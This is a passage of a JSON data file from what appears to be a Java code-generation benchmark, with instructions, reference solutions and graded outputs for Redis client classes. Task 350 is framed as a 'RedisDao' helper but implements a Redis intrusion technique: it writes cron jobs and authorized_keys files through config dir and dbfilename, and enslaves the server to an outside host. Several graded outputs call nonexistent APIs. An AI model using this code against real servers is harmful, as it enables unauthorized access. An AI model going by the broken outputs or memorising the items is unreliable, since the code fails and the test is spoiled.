setStringValue(String key, String value, int seconds) {\n        String result = null;\n        ShardedJedis client = getInstance();\n        try {\n            result = client.setex(key, seconds, value);\n        } catch (Exception e) {\n            logger.error(e.getMessage(), e);\n        } finally {\n            if (client != null) {\n                client.close();\n            }\n        }\n        return result;\n    }\n\n    public static String setObjectValue(String key, Object obj, int seconds) {\n        String result = null;\n        ShardedJedis client = getInstance();\n        try {\n            result = client.setex(key.getBytes(), seconds, serialize(obj));\n        } catch (Exception e) {\n            logger.error(e.getMessage(), e);\n        } finally {\n            if (client != null) {\n                client.close();\n            }\n        }\n        return result;\n    }\n\n    public static String getStringValue(String key) {\n        String value = null;\n        ShardedJedis client = getInstance();\n        try {\n            value = client.get(key);\n        } catch (Exception e) {\n            logger.error(e.getMessage(), e);\n        } finally {\n            if (client != null) {\n                client.close();\n            }\n        }\n        return value;\n    }\n\n    public static Object getObjectValue(String key) {\n        Object obj = null;\n        ShardedJedis client = getInstance();\n        try {\n            byte[] bytes = client.get(key.getBytes());\n            if (bytes != null && bytes.length > 0) {\n                obj = unserialize(bytes);\n            }\n        } catch (Exception e) {\n            logger.error(e.getMessage(), e);\n        } finally {\n            if (client != null) {\n                client.close();\n            }\n        }\n        return obj;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "right_result": "import org.slf4j.Logger; import org.slf4j.LoggerFactory; import redis.clients.jedis.HostAndPort; import redis.clients.jedis.ShardedJedis; import redis.clients.jedis.ShardedJedisPool; import redis.clients.jedis.JedisPoolConfig; import java.io.ByteArrayOutputStream; import java.io.ObjectOutputStream; import java.io.ByteArrayInputStream; import java.io.ObjectInputStream; import java.util.ArrayList; import java.util.List; import java.util.concurrent.locks.ReentrantLock; public class JedisUtil { private static final Logger logger = LoggerFactory.getLogger(JedisUtil.class); private String address; private ShardedJedisPool shardedJedisPool; private final ReentrantLock INSTANCE_INIT_LOCL = new ReentrantLock(); private static final JedisUtil INSTANCE = new JedisUtil(); private JedisUtil() {} public static JedisUtil getInstance() { return INSTANCE; } public void init(String address) { this.address = address; INSTANCE_INIT_LOCL.lock(); try { if (shardedJedisPool == null) { List<HostAndPort> hosts = new ArrayList<>(); for (String hostStr : address.split(\",\")) { String[] parts = hostStr.split(\":\"); hosts.add(new HostAndPort(parts[0], Integer.parseInt(parts[1]))); } JedisPoolConfig poolConfig = new JedisPoolConfig(); shardedJedisPool = new ShardedJedisPool(poolConfig, hosts); } } finally { INSTANCE_INIT_LOCL.unlock(); } } public ShardedJedis getResource() { INSTANCE_INIT_LOCL.lock(); try { if (shardedJedisPool == null) { throw new IllegalStateException(\"Pool not initialized\"); } return shardedJedisPool.getResource(); } finally { INSTANCE_INIT_LOCL.unlock(); } } public void close() { if (shardedJedisPool != null) { shardedJedisPool.close(); } } public byte[] serialize(Object object) { try (ByteArrayOutputStream bos = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(bos)) { oos.writeObject(object); return bos.toByteArray(); } catch (Exception e) { logger.error(\"Error serializing object\", e); throw new RuntimeException(\"Serialization failed\", e); } } public Object unserialize(byte[] bytes) { try (ByteArrayInputStream bis = new ByteArrayInputStream(bytes); ObjectInputStream ois = new ObjectInputStream(bis)) { return ois.readObject(); } catch (Exception e) { logger.error(\"Error deserializing object\", e); throw new RuntimeException(\"Deserialization failed\", e); } } public String setStringValue(String key, String value, int seconds) { ShardedJedis shardedJedis = getResource(); return shardedJedis.setex(key, seconds, value); } public String setObjectValue(String key, Object obj, int seconds) { byte[] serialized = serialize(obj); ShardedJedis shardedJedis = getResource(); return shardedJedis.setex(key, seconds, serialized); } public String getStringValue(String key) { ShardedJedis shardedJedis = getResource(); return shardedJedis.get(key); } public Object getObjectValue(String key) { ShardedJedis shardedJedis = getResource(); byte[] bytes = shardedJedis.get(key); if (bytes == null) { return null; } return unserialize(bytes); } }"
  },
  {
    "Task_id": 343,
    "Instruction": "Task Description: Create a Java class that provides a client interface for interacting with Redis JSON data structures using the Lettuce Redis client library. The class should handle connection management and provide methods for common JSON operations.\n\nClass Description: RedisJsonClient is a wrapper class for Lettuce Redis client that specializes in JSON operations. It manages Redis connections and provides synchronous methods to manipulate JSON data stored in Redis.\n\nAttributes:\n- client: RedisClient - The main Redis client instance for connection management\n- syncCommands: RedisCommands<String, String> - Synchronous command interface for Redis operations\n\nMethods:\n- RedisJsonClient(String host, int port) -> void - Constructor that initializes the Redis connection with the specified host and port\n- jsonGet(String key, JsonPath path) -> JsonValue - Retrieves JSON value at specified path from given key\n- jsonSet(String key, JsonPath path, JsonValue value) -> String - Sets JSON value at specified path for given key\n- jsonDel(String key, JsonPath path) -> Long - Deletes JSON value at specified path from given key\n- jsonArrlen(String key, JsonPath path) -> List<Long> - Gets length of JSON array at specified path\n- jsonArrpop(String key, JsonPath path) -> List<JsonValue> - Pops elements from JSON array at specified path\n- close() -> void - Shuts down the Redis connection and releases resources\n- createJsonValue(String value) -> JsonValue - Creates a new JsonValue from string\n- createJsonObject() -> JsonObject - Creates a new empty JsonObject\n- createJsonArray() -> JsonArray - Creates a new empty JsonArray",
    "Canonical_solution": "import io.lettuce.core.RedisClient;\nimport io.lettuce.core.RedisURI;\nimport io.lettuce.core.api.StatefulRedisConnection;\nimport io.lettuce.core.api.sync.RedisCommands;\nimport io.lettuce.core.codec.ByteArrayCodec;\nimport io.lettuce.core.json.JsonParser;\nimport io.lettuce.core.json.JsonPath;\nimport io.lettuce.core.json.JsonValue;\n\npublic class RedisJsonClient {\n\n    private RedisClient client;\n    private RedisCommands<String, String> syncCommands;\n\n    public RedisJsonClient(String host, int port) {\n        RedisURI redisURI = RedisURI.Builder.redis(host).withPort(port).build();\n        client = RedisClient.create(redisURI);\n        syncCommands = client.connect().sync();\n    }\n\n    public JsonValue jsonGet(String key, JsonPath path) {\n        List<JsonValue> values = syncCommands.jsonGet(key, path);\n        return values != null && !values.isEmpty() ? values.get(0) : null;\n    }\n\n    public String jsonSet(String key, JsonPath path, JsonValue value) {\n        return syncCommands.jsonSet(key, path, value);\n    }\n\n    public Long jsonDel(String key, JsonPath path) {\n        return syncCommands.jsonDel(key, path);\n    }\n\n    public List<Long> jsonArrlen(String key, JsonPath path) {\n        return syncCommands.jsonArrlen(key, path);\n    }\n\n    public List<JsonValue> jsonArrpop(String key, JsonPath path) {\n        return syncCommands.jsonArrpop(key, path);\n    }\n\n    public void close() {\n        if (client != null) {\n            client.shutdown();\n        }\n    }\n\n    public JsonValue createJsonValue(String value) {\n        return syncCommands.getJsonParser().createJsonValue(value);\n    }\n\n    public JsonObject createJsonObject() {\n        return syncCommands.getJsonParser().createJsonObject();\n    }\n\n    public JsonArray createJsonArray() {\n        return syncCommands.getJsonParser().createJsonArray();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "right_result": "import io.lettuce.core.RedisClient;\nimport io.lettuce.core.api.sync.RedisCommands;\nimport java.util.List;\nimport java.util.stream.Collectors;\n\npublic class RedisJsonClient {\n    private final RedisClient client;\n    private final RedisCommands<String, String> syncCommands;\n\n    public RedisJsonClient(String host, int port) {\n        client = RedisClient.create(\"redis://\" + host + \":\" + port);\n        syncCommands = client.sync();\n    }\n\n    public JsonValue jsonGet(String key, JsonPath path) {\n        return createJsonValue(syncCommands.jsonGet(key, path.toString()));\n    }\n\n    public String jsonSet(String key, JsonPath path, JsonValue value) {\n        return syncCommands.jsonSet(key, path.toString(), value.toString());\n    }\n\n    public Long jsonDel(String key, JsonPath path) {\n        return syncCommands.jsonDel(key, path.toString());\n    }\n\n    public List<Long> jsonArrlen(String key, JsonPath path) {\n        return syncCommands.jsonArrlen(key, path.toString());\n    }\n\n    public List<JsonValue> jsonArrpop(String key, JsonPath path) {\n        return syncCommands.jsonArrpop(key, path.toString())\n                .stream()\n                .map(this::createJsonValue)\n                .collect(Collectors.toList());\n    }\n\n    public void close() {\n        client.shutdown();\n    }\n\n    public JsonValue createJsonValue(String value) {\n        return new JsonValue(value);\n    }\n\n    public JsonObject createJsonObject() {\n        return new JsonObject();\n    }\n\n    public JsonArray createJsonArray() {\n        return new JsonArray();\n    }\n}"
  },
  {
    "Task_id": 344,
    "Instruction": "Task Description: Create a Java class that provides asynchronous Redis hash operations using the Lettuce client, including CRUD operations and field manipulation.\n\nClass Description: RedisHashInteraction is a utility class that encapsulates asynchronous Redis hash operations. It manages Redis connections and provides thread-safe methods for interacting with Redis hashes.\n\nAttributes:\n- redisClient: RedisClient - The main Redis client instance for creating connections\n- connection: StatefulRedisConnection<String, String> - The persistent connection to Redis\n- asyncCommands: RedisAsyncCommands<String, String> - The asynchronous command interface for Redis operations\n\nMethods:\n- Constructor(redisUri: String) -> void - Initializes the Redis client and establishes a connection using the provided URI\n- deleteKeys(keys: String...) -> CompletableFuture<Long> - Deletes one or more keys from Redis and returns the count of deleted keys\n- setHash(key: String, hash: Map<String, String>) -> CompletableFuture<Long> - Sets multiple hash fields at once for a given key\n- getHashField(key: String, field: String) -> CompletableFuture<String> - Retrieves the value of a specific field in a hash\n- getAllHashFields(key: String) -> CompletableFuture<Map<String, String>> - Retrieves all fields and values of a hash\n- incrementHashField(key: String, field: String, amount: long) -> CompletableFuture<Long> - Increments the integer value of a hash field by the given amount\n- closeConnection() -> void - Properly closes the Redis connection and shuts down the client",
    "Canonical_solution": "import io.lettuce.core.RedisClient;\nimport io.lettuce.core.api.async.RedisAsyncCommands;\nimport io.lettuce.core.api.StatefulRedisConnection;\nimport java.util.HashMap;\nimport java.util.Map;\nimport java.util.concurrent.CompletableFuture;\n\npublic class RedisHashInteraction {\n\n    private RedisClient redisClient;\n    private StatefulRedisConnection<String, String> connection;\n    private RedisAsyncCommands<String, String> asyncCommands;\n\n    public RedisHashInteraction(String redisUri) {\n        this.redisClient = RedisClient.create(redisUri);\n        this.connection = redisClient.connect();\n        this.asyncCommands = connection.async();\n    }\n\n    public CompletableFuture<Long> deleteKeys(String... keys) {\n        return asyncCommands.del(keys).toCompletableFuture();\n    }\n\n    public CompletableFuture<Long> setHash(String key, Map<String, String> hash) {\n        return asyncCommands.hset(key, hash).toCompletableFuture();\n    }\n\n    public CompletableFuture<String> getHashField(String key, String field) {\n        return asyncCommands.hget(key, field).toCompletableFuture();\n    }\n\n    public CompletableFuture<Map<String, String>> getAllHashFields(String key) {\n        return asyncCommands.hgetall(key).toCompletableFuture();\n    }\n\n    public CompletableFuture<Long> incrementHashField(String key, String field, long amount) {\n        return asyncCommands.hincrby(key, field, amount).toCompletableFuture();\n    }\n\n    public void closeConnection() {\n        if (connection != null) {\n            connection.close();\n        }\n        if (redisClient != null) {\n            redisClient.shutdown();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "right_result": "import io.lettuce.core.RedisClient;\nimport io.lettuce.core.api.StatefulRedisConnection;\nimport io.lettuce.core.api.RedisAsyncCommands;\nimport java.util.Map;\nimport java.util.concurrent.CompletableFuture;\n\npublic class RedisHashInteraction {\n    private final RedisClient redisClient;\n    private final StatefulRedisConnection<String, String> connection;\n    private final RedisAsyncCommands<String, String> asyncCommands;\n\n    public RedisHashInteraction(String redisUri) {\n        this.redisClient = RedisClient.create(redisUri);\n        this.connection = this.redisClient.connect();\n        this.asyncCommands = this.connection.async();\n    }\n\n    public CompletableFuture<Long> deleteKeys(String... keys) {\n        return asyncCommands.delete(keys);\n    }\n\n    public CompletableFuture<Long> setHash(String key, Map<String, String> hash) {\n        return asyncCommands.multiSet(key, hash);\n    }\n\n    public CompletableFuture<String> getHashField(String key, String field) {\n        return asyncCommands.get(key, field);\n    }\n\n    public CompletableFuture<Map<String, String>> getAllHashFields(String key) {\n        return asyncCommands.hgetAll(key);\n    }\n\n    public CompletableFuture<Long> incrementHashField(String key, String field, long amount) {\n        return asyncCommands.incrBy(key, field, amount);\n    }\n\n    public void closeConnection() {\n        connection.close();\n        redisClient.shutdown();\n    }\n}"
  },
  {
    "Task_id": 346,
    "Instruction": "Task Description: Create a Java class for managing Redis cluster connections and operations using Jedis and UnifiedJedis clients.\n\nClass Description: The RedisClusterManager class provides functionality to interact with a Redis cluster, including connection management, bucket creation/initialization, and performing Redis operations. It supports both JedisCluster and UnifiedJedis interfaces for cluster operations.\n\nAttributes:\n- jedisCluster: JedisCluster - The Jedis cluster client instance for Redis operations\n- unifiedJedisCluster: UnifiedJedis - The UnifiedJedis interface for Redis cluster operations (wraps jedisCluster)\n\nMethods:\n- RedisClusterManager(List<HostAndPort> shards) -> void - Constructor that initializes the Redis cluster connection using provided shards\n- createBucket(String key) -> byte[] - Converts a string key to UTF-8 bytes for Redis operations\n- initializeBucket(byte[] key) -> void - Placeholder for bucket initialization logic using the cluster client\n- performRedisOperations(byte[] key) -> void - Placeholder for performing CRUD operations on the cluster\n- closeConnections() -> void - Properly closes all Redis cluster connections\n- createShards(String host, List<Integer> ports) -> List<HostAndPort> - Static helper method to create shard configurations from host and ports",
    "Canonical_solution": "import java.nio.charset.StandardCharsets;\nimport java.util.ArrayList;\nimport java.util.HashSet;\nimport java.util.List;\nimport java.util.UUID;\n\nimport redis.clients.jedis.HostAndPort;\nimport redis.clients.jedis.JedisCluster;\nimport redis.clients.jedis.UnifiedJedis;\n\npublic class RedisClusterManager {\n\n    private JedisCluster jedisCluster;\n    private UnifiedJedis unifiedJedisCluster;\n\n    public RedisClusterManager(List<HostAndPort> shards) {\n        this.jedisCluster = new JedisCluster(new HashSet<>(shards));\n        this.unifiedJedisCluster = this.jedisCluster;\n    }\n\n    public byte[] createBucket(String key) {\n        byte[] byteKey = key.getBytes(StandardCharsets.UTF_8);\n        return byteKey;\n    }\n\n    public void initializeBucket(byte[] key) {\n        // Initialize bucket logic using jedisCluster\n    }\n\n    public void performRedisOperations(byte[] key) {\n        // Perform CRUD operations using jedisCluster\n    }\n\n    public void closeConnections() {\n        try {\n            if (jedisCluster != null) {\n                jedisCluster.close();\n            }\n            if (unifiedJedisCluster != null) {\n                unifiedJedisCluster.close();\n            }\n        } catch (Exception e) {\n            // Handle exception\n        }\n    }\n\n    public static List<HostAndPort> createShards(String host, List<Integer> ports) {\n        List<HostAndPort> shards = new ArrayList<>();\n        for (Integer port : ports) {\n            shards.add(new HostAndPort(host, port));\n        }\n        return shards;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "right_result": "import redis.clients.jedis.HostAndPort;\nimport redis.clients.jedis.JedisCluster;\nimport redis.clients.jedis.UnifiedJedis;\nimport java.util.List;\nimport java.nio.charset.StandardCharsets;\nimport java.util.ArrayList;\n\npublic class RedisClusterManager {\n    private JedisCluster jedisCluster;\n    private UnifiedJedis unifiedJedisCluster;\n\n    public RedisClusterManager(List<HostAndPort> shards) {\n        this.jedisCluster = new JedisCluster(shards);\n        this.unifiedJedisCluster = new UnifiedJedis(jedisCluster);\n    }\n\n    public byte[] createBucket(String key) {\n        return key.getBytes(StandardCharsets.UTF_8);\n    }\n\n    public void initializeBucket(byte[] key) {\n        // Placeholder for bucket initialization logic using the cluster client\n    }\n\n    public void performRedisOperations(byte[] key) {\n        // Placeholder for performing CRUD operations on the cluster\n    }\n\n    public void closeConnections() {\n        if (jedisCluster != null) {\n            jedisCluster.close();\n        }\n    }\n\n    public static List<HostAndPort> createShards(String host, List<Integer> ports) {\n        List<HostAndPort> shards = new ArrayList<>();\n        for (Integer port : ports) {\n            shards.add(new HostAndPort(host, port));\n        }\n        return shards;\n    }\n}"
  },
  {
    "Task_id": 348,
    "Instruction": "Task Description: Create a Redis connection manager class in Java that handles connection pooling, resource management, and basic Redis operations.\n\nClass Description: RedisConnectionManager is a utility class that manages Redis connections using Jedis connection pooling. It provides methods to get connections, execute commands, and properly close connections to ensure resource efficiency.\n\nAttributes:\n- jedisPool: JedisPool - The connection pool instance that manages Redis connections\n\nMethods:\n- RedisConnectionManager(String host, int port, int timeout, String password) -> void - Constructor that initializes the connection pool with specified parameters\n- getConnection() -> Jedis - Retrieves a Redis connection from the pool\n- closeConnection(Jedis jedis) -> void - Returns a connection to the pool\n- closePool() -> void - Closes the entire connection pool\n- executeCommand(String key, String value) -> void - Executes a basic Redis SET/GET operation and prints the result",
    "Canonical_solution": "import redis.clients.jedis.Jedis;\nimport redis.clients.jedis.JedisPool;\nimport redis.clients.jedis.JedisPoolConfig;\n\npublic class RedisConnectionManager {\n\n    private JedisPool jedisPool;\n\n    public RedisConnectionManager(String host, int port, int timeout, String password) {\n        JedisPoolConfig poolConfig = new JedisPoolConfig();\n        this.jedisPool = new JedisPool(poolConfig, host, port, timeout, password);\n    }\n\n    public Jedis getConnection() {\n        return jedisPool.getResource();\n    }\n\n    public void closeConnection(Jedis jedis) {\n        if (jedis != null) {\n            jedis.close();\n        }\n    }\n\n    public void closePool() {\n        if (jedisPool != null && !jedisPool.isClosed()) {\n            jedisPool.close();\n        }\n    }\n\n    public void executeCommand(String key, String value) {\n        try (Jedis jedis = getConnection()) {\n            jedis.set(key, value);\n            String result = jedis.get(key);\n            System.out.println(\"Redis operation result: \" + result);\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "right_result": "```java\nimport redis.clients.jedis.JedisPool;\nimport redis.clients.jedis.JedisPoolConfig;\n\npublic class RedisConnectionManager {\n    private JedisPool jedisPool;\n\n    public RedisConnectionManager(String host, int port, int timeout, String password) {\n        JedisPoolConfig poolConfig = new JedisPoolConfig();\n        poolConfig.setMaxTotal(10);\n        poolConfig.setMaxIdle(10);\n        this.jedisPool = new JedisPool(poolConfig, host, port, timeout, password);\n    }\n\n    public Jedis getConnection() {\n        return jedisPool.getResource();\n    }\n\n    public void closeConnection(Jedis jedis) {\n        jedisPool.returnResource(jedis);\n    }\n\n    public void closePool() {\n        jedisPool.close();\n    }\n\n    public void executeCommand(String key, String value) {\n        Jedis jedis = getConnection();\n        try {\n            jedis.set(key, value);\n            String result = jedis.get(key);\n            System.out.println(\"Result: \" + result);\n        } finally {\n            closeConnection(jedis);\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 350,
    "Instruction": "Task Description: Create a Java class that provides Redis database operations including connection management, configuration changes, data persistence, and cleanup operations.\n\nClass Description: The RedisDao class encapsulates Redis operations using the Jedis client. It handles connection establishment, authentication, configuration management, data persistence, and cleanup tasks. The class supports various Redis operations including slave configuration, cron job setup, SSH key injection, and system cleanup.\n\nAttributes:\n- CONN: Jedis - Static instance of Redis connection\n- dir: List<String> - Static list storing Redis directory configuration\n- slaveReadOnlyFlag: String - Static flag for slave read-only configuration (default \"yes\")\n- ip: String - Redis server IP address\n- port: int - Redis server port number\n- password: String - Redis authentication password\n- timeout: int - Connection timeout in milliseconds\n\nMethods:\n- testConnection(): void - Tests Redis connection by creating a temporary connection, authenticating if needed, retrieving server info, and closing the connection\n- getConnection(): void - Establishes a persistent Redis connection and authenticates if required\n- closeConnection(): void - Closes the active Redis connection\n- getInfo(): void - Retrieves Redis server information and configuration directory\n- redisavedb(String dir, String dbfilename): void - Configures Redis persistence directory and filename, then triggers a save operation\n- redisslave(String vpsIp, String vpsPort): void - Configures Redis as a slave of another instance\n- crontab(String cronText): void - Attempts to create cron jobs by writing to various cron directories\n- sshkey(String sshRsa, String Path): void - Writes SSH public key to specified directory as authorized_keys\n- clean(): void - Restores original Redis configuration and cleans up temporary data",
    "Canonical_solution": "import redis.clients.jedis.Jedis;\nimport java.util.List;\n\npublic class RedisDao {\n    public static Jedis CONN;\n    public static List<String> dir;\n    public static String slaveReadOnlyFlag = \"yes\";\n\n    private String ip;\n    private int port;\n    private String password;\n    private int timeout;\n\n    public RedisDao(String ip, String port, String password, String timeout) {\n        this.ip = ip;\n        this.port = Integer.parseInt(port);\n        this.password = password;\n        this.timeout = Integer.parseInt(timeout) * 1000;\n    }\n\n    public void testConnection() {\n        CONN = new Jedis(ip, port, timeout);\n        if (password.length() != 0) {\n            CONN.auth(password);\n        }\n        CONN.info();\n        if (CONN != null) {\n            CONN.close();\n        }\n    }\n\n    public void getConnection() throws Exception {\n        CONN = new Jedis(ip, port, timeout);\n        if (password.length() != 0) {\n            CONN.auth(password);\n        }\n    }\n\n    public void closeConnection() throws Exception {\n        if (CONN != null) {\n            CONN.close();\n        }\n    }\n\n    public void getInfo() throws Exception {\n        String info = CONN.info();\n        dir = CONN.configGet(\"dir\");\n    }\n\n    public void redisavedb(String dir, String dbfilename) {\n        CONN.configSet(\"dir\", dir);\n        CONN.configSet(\"dbfilename\", dbfilename);\n        CONN.save();\n    }\n\n    public void redisslave(String vpsIp, String vpsPort) {\n        CONN.slaveof(vpsIp, Integer.parseInt(vpsPort));\n    }\n\n    public void crontab(String cronText) {\n        List<String> crondirs = Arrays.asList(\"/var/spool/cron/\", \"/var/spool/cron/crontab/\", \"/var/spool/cron/crontabs/\");\n        for (String dir : crondirs) {\n            try {\n                String randomString = Utils.getRandomString();\n                CONN.set(\"xxcron\", \"\\n\\n\" + cronText + \"\\n\\n\");\n                CONN.configSet(\"dir\", dir);\n                CONN.configSet(\"dbfilename\", randomString);\n                CONN.save();\n                break;\n            } catch (Exception e) {\n                // Handle exception\n            }\n        }\n    }\n\n    public void sshkey(String sshRsa, String Path) {\n        CONN.set(\"xxssh\", \"\\n\\n\" + sshRsa + \"\\n\\n\");\n        CONN.configSet(\"dir\", Path);\n        CONN.configSet(\"dbfilename\", \"authorized_keys\");\n        CONN.save();\n    }\n\n    public void clean() {\n        CONN.configSet(\"dir\", dir.get(1));\n        CONN.configSet(\"slave-read-only\", slaveReadOnlyFlag);\n        CONN.configSet(\"dbfilename\", \"dump.rdb\");\n        CONN.slaveofNoOne();\n        CONN.moduleUnload(\"system\");\n        CONN.del(\"xxssh\");\n        CONN.del(\"xxcron\");\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "right_result": "import redis.clients.jedis.Jedis;  \nimport java.io.FileWriter;  \nimport java.io.IOException;  \nimport java.util.List;  \nimport java.util.ArrayList;  \n\npublic class RedisDao {  \n    private static Jedis CONN;  \n    private static List<String> dir;  \n    private static String slaveReadOnlyFlag = \"yes\";  \n    private String ip;  \n    private int port;  \n    private String password;  \n    private int timeout;  \n\n    public RedisDao(String ip, int port, String password, int timeout) {  \n        this.ip = ip;  \n        this.port = port;  \n        this.password = password;  \n        this.timeout = timeout;  \n    }  \n\n    public void testConnection() {  \n        Jedis tempConn = new Jedis(ip, port);  \n        if (password != null && !password.isEmpty()) {  \n            tempConn.auth(password);  \n        }  \n        System.out.println(tempConn.info());  \n        tempConn.close();  \n    }  \n\n    public void getConnection() {  \n        if (CONN == null) {  \n            CONN = new Jedis(ip, port, timeout);  \n            if (password != null && !password.isEmpty()) {  \n                CONN.auth(password);  \n            }  \n        }  \n    }  \n\n    public void closeConnection() {  \n        if (CONN != null) {  \n            CONN.close();  \n            CONN = null;  \n        }  \n    }  \n\n    public void getInfo() {  \n        if (CONN == null) {  \n            getConnection();  \n        }  \n        String serverInfo = CONN.info();  \n        System.out.println(\"Server Info:\\n\" + serverInfo);  \n        String dirValue = CONN.configGet(\"dir\").get(0).getValue();  \n        dir = new ArrayList<>(List.of(dirValue));  \n        System.out.println(\"Configuration Directory: \" + dir);  \n    }  \n\n    public void redisavedb(String dir, String dbfilename) {  \n        if (CONN == null) {  \n            getConnection();  \n        }  \n        CONN.configSet(\"dir\", dir);  \n        CONN.configSet(\"dbfilename\", dbfilename);  \n        CONN.save();  \n        System.out.println(\"Redis persistence configured and saved.\");  \n    }  \n\n    public void redisslave(String vpsIp, String vpsPort) {  \n        if (CONN == null) {  \n            getConnection();  \n        }  \n        CONN.slaveof(vpsIp, Integer.parseInt(vpsPort));  \n        System.out.println(\"Redis configured as slave of \" + vpsIp + \":\" + vpsPort);  \n    }  \n\n    public void crontab(String cronText) {  \n        String[] cronDirs = {\"/etc/crontab\", \"/var/spool/cron/root\"};  \n        for (String dir : cronDirs) {  \n            try (FileWriter writer = new FileWriter(dir)) {  \n                writer.write(cronText);  \n            } catch (IOException e) {  \n                e.printStackTrace();  \n            }  \n        }  \n    }  \n\n    public void sshkey(String sshRsa, String Path) {  \n        try (FileWriter writer = new FileWriter(Path + \"/authorized_keys\")) {  \n            writer.write(sshRsa);  \n        } catch (IOException e) {  \n            e.printStackTrace();  \n        }  \n    }  \n\n    public void clean() {  \n        dir.clear();  \n        slaveReadOnlyFlag = \"yes\";  \n        closeConnection();  \n    }  \n}"
  },
  {
    "Task_id": 351,
    "Instruction": "Task Description: Create a Java class that establishes and manages a connection to a Redis master-slave setup using Lettuce client, allowing read operations to prefer the master node while maintaining failover capabilities.\n\nClass Description: The RedisMasterSlaveConnector class provides functionality to connect to a Redis master-slave cluster, manage the connection, and properly clean up resources when done. It uses Lettuce's MasterReplica API for high availability support.\n\nAttributes:\n- redisClient: RedisClient - The underlying Redis client instance used for connection management\n- connection: StatefulRedisMasterReplicaConnection<String, String> - The active connection to the Redis master-slave cluster\n\nMethods:\n- RedisMasterSlaveConnector() -> void - Constructor that initializes the RedisClient instance\n- connect(List<RedisURI> nodes) -> void - Establishes a connection to the Redis master-slave cluster using the provided node URIs and configures read preference\n- getConnection() -> StatefulRedisMasterReplicaConnection<String, String> - Returns the active Redis master-slave connection\n- close() -> void - Properly closes the connection and shuts down the Redis client to release resources",
    "Canonical_solution": "import io.lettuce.core.ReadFrom;\nimport io.lettuce.core.RedisClient;\nimport io.lettuce.core.RedisURI;\nimport io.lettuce.core.codec.StringCodec;\nimport io.lettuce.core.masterreplica.MasterReplica;\nimport io.lettuce.core.masterreplica.StatefulRedisMasterReplicaConnection;\nimport java.util.Arrays;\nimport java.util.List;\n\npublic class RedisMasterSlaveConnector {\n\n    private RedisClient redisClient;\n    private StatefulRedisMasterReplicaConnection<String, String> connection;\n\n    public RedisMasterSlaveConnector() {\n        this.redisClient = RedisClient.create();\n    }\n\n    public void connect(List<RedisURI> nodes) {\n        this.connection = MasterReplica.connect(redisClient, StringCodec.UTF8, nodes);\n        connection.setReadFrom(ReadFrom.UPSTREAM_PREFERRED);\n    }\n\n    public StatefulRedisMasterReplicaConnection<String, String> getConnection() {\n        return this.connection;\n    }\n\n    public void close() {\n        if (connection != null) {\n            connection.close();\n        }\n        if (redisClient != null) {\n            redisClient.shutdown();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "right_result": "import io.lettuce.core.RedisClient;\nimport io.lettuce.core.api.StatefulRedisMasterReplicaConnection;\nimport io.lettuce.core.RedisURI;\nimport io.lettuce.core.ReadPreference;\nimport java.util.List;\n\npublic class RedisMasterSlaveConnector {\n    private final RedisClient redisClient;\n    private StatefulRedisMasterReplicaConnection<String, String> connection;\n\n    public RedisMasterSlaveConnector() {\n        this.redisClient = RedisClient.create();\n    }\n\n    public void connect(List<RedisURI> nodes) {\n        this.redisClient = RedisClient.create(nodes);\n        this.connection = this.redisClient.connect();\n        this.connection.setReadPreference(ReadPreference.MASTER);\n    }\n\n    public StatefulRedisMasterReplicaConnection<String, String> getConnection() {\n        return this.connection;\n    }\n\n    public void close() {\n        if (connection != null) {\n            connection.close();\n        }\n        if (redisClient != null) {\n            redisClient.shutdown();\n        }\n    }\n}"
  },
  {
    "Task_id": 354,
    "Instruction": "Task Description: Create a Java class that manages Redis connections and operations using the Jedis client library, providing connection pooling and basic CRUD functionality.\n\nClass Description: RedisConnectionManager is a utility class that handles Redis connection management, authentication, and basic operations. It uses JedisPooled for connection pooling and provides thread-safe access to Redis resources.\n\nAttributes:\n- jedisPool: JedisPooled - The pooled Redis connection manager\n- poolConfig: GenericObjectPoolConfig<Connection> - Configuration for the connection pool\n\nMethods:\n- RedisConnectionManager(HostAndPort hostAndPort, DefaultJedisClientConfig clientConfig) -> void - Constructor that initializes the connection with host/port and client configuration\n- RedisConnectionManager(HostAndPort hostAndPort, DefaultJedisClientConfig clientConfig, GenericObjectPoolConfig<Connection> poolConfig) -> void - Constructor with additional pool configuration\n- getConnection() -> Connection - Gets a connection from the pool\n- closeConnection(Connection connection) -> void - Returns a connection to the pool\n- setCredentialsProvider(RedisCredentialsProvider credentialsProvider) -> void - Updates the authentication credentials\n- executeCommand(String key, String value) -> void - Executes a SET command\n- getValue(String key) -> String - Executes a GET command and returns the value\n- close() -> void - Closes all connections and releases resources",
    "Canonical_solution": "import redis.clients.jedis.JedisPooled;\nimport redis.clients.jedis.Connection;\nimport redis.clients.jedis.DefaultJedisClientConfig;\nimport redis.clients.jedis.HostAndPort;\nimport redis.clients.jedis.exceptions.JedisException;\nimport redis.clients.jedis.util.RedisCredentialsProvider;\nimport redis.clients.jedis.util.DefaultRedisCredentialsProvider;\nimport redis.clients.jedis.util.DefaultRedisCredentials;\nimport org.apache.commons.pool2.impl.GenericObjectPoolConfig;\n\npublic class RedisConnectionManager {\n\n    private JedisPooled jedisPool;\n    private GenericObjectPoolConfig<Connection> poolConfig;\n\n    public RedisConnectionManager(HostAndPort hostAndPort, DefaultJedisClientConfig clientConfig) {\n        this.jedisPool = new JedisPooled(hostAndPort, clientConfig);\n    }\n\n    public RedisConnectionManager(HostAndPort hostAndPort, DefaultJedisClientConfig clientConfig, \n                                GenericObjectPoolConfig<Connection> poolConfig) {\n        this.poolConfig = poolConfig;\n        this.jedisPool = new JedisPooled(hostAndPort, clientConfig, poolConfig);\n    }\n\n    public Connection getConnection() throws JedisException {\n        return jedisPool.getPool().getResource();\n    }\n\n    public void closeConnection(Connection connection) {\n        if (connection != null) {\n            connection.close();\n        }\n    }\n\n    public void setCredentialsProvider(RedisCredentialsProvider credentialsProvider) {\n        DefaultJedisClientConfig clientConfig = DefaultJedisClientConfig.builder()\n            .credentialsProvider(credentialsProvider)\n            .build();\n        this.jedisPool = new JedisPooled(jedisPool.getPool().getAddress(), clientConfig);\n    }\n\n    public void executeCommand(String 